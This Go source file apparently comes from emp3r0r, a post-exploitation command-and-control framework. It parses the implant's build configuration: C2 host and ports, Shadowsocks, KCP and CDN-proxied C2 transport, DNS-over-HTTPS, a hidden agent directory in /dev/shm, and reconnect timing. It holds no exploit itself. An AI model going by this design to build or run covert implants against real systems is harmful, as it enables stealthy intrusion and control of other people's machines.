package emp3r0r_data

import (
	"encoding/json"
	"fmt"
	"log"
	"strconv"
)

// ReadJSONConfig read runtime variables from JSON, and apply them
func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
	// parse the json
	err = json.Unmarshal(jsonData, config_to_write)
	if err != nil {
		return fmt.Errorf("failed to parse JSON config: %v", err)
	}
	calculateReverseProxyPort := func() string {
		p, err := strconv.Atoi(config_to_write.ProxyPort)
		if err != nil {
			log.Printf("WTF? ProxyPort %s: %v", config_to_write.ProxyPort, err)
			return "22222"
		}

		// reverseProxyPort
		rProxyPortInt := p + 1
		return strconv.Itoa(rProxyPortInt)
	}
	config_to_write.ReverseProxyPort = calculateReverseProxyPort()

	// these variables are decided by other variables
	CCAddress = fmt.Sprintf("https://%s", config_to_write.CCHost)
	LibPath = config_to_write.AgentRoot + "/lib"
	DefaultShell = config_to_write.UtilsPath + "/bash"
	AESKey = GenAESKey("Your Pre Shared AES Key: " + MagicString)

	return
}

// Config build.json config file
type Config struct {
	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
	ShadowsocksPassword  string `json:"shadowsocks_password"`   // password of shadowsocks proxy server
	ShadowsocksPort      string `json:"shadowsocks_port"`       // server port of shadowsocks proxy server
	KCPPort              string `json:"kcp_port"`               // server port of kcp server
	UseShadowsocks       bool   `json:"use_shadowsocks"`        // enable shadowsocks proxy server for C2 transport
	UseKCP               bool   `json:"use_kcp"`                // enable KCP for Shadowsocks C2 transport
	ReverseProxyPort     string `json:"reverse_proxy_port"`     // "reverse_proxy_port": "56239",
	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // seconds, set max to 0 to disable
	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // seconds, set max to 0 to disable
	CCHost               string `json:"ccip"`                   // "ccip": "192.168.40.137",
	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
	CCIndicator          string `json:"cc_indicator"`           // URL of CC indicator
	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // seconds
	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // seconds, set max to 0 to disable
	CCIndicatorText      string `json:"indicator_text"`         // what to send in response when indicator URL is requested
	CA                   string `json:"ca"`                     // CA cert from server side
	AgentProxy           string `json:"agent_proxy"`            // proxy for C2 transport
	CDNProxy             string `json:"cdn_proxy"`              // websocket proxy, see go-cdn2proxy
	DoHServer            string `json:"doh_server"`             // DNS over HTTPS server, for name resolving
	SocketName           string `json:"socket"`                 // agent socket, use this to check agent status
	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
	UtilsPath            string `json:"utils_path"`             // where to store `vaccine` files
	AgentUUID            string `json:"agent_uuid"`             // UUID of agent
	AgentTag             string `json:"agent_tag"`              // generated from UUID, will be used to identidy agents
	Timeout              int    `json:"timeout"`                // wait until this amount of milliseconds to re-connect to C2
}
